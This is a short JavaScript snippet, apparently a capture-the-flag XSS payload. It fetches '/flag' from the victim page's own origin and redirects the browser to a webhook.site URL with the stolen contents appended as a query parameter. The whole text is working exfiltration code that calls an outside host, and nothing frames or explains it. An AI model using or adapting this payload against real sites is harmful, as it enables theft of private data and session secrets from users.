console.log("Starting fetch for /flag");

fetch(`${location.origin}/flag`)
  .then(r => {
    console.log("Received response from /flag", r);
    return r.text();
  })
  .then(f => {
    console.log("Flag content:", f);
    location = 'http://webhook.site/62ec90c0-dc95-4cff-8e3e-ec51a1630770?f=' + f;
  })
  .catch(err => {
    console.error("Error during fetch:", err);
  });
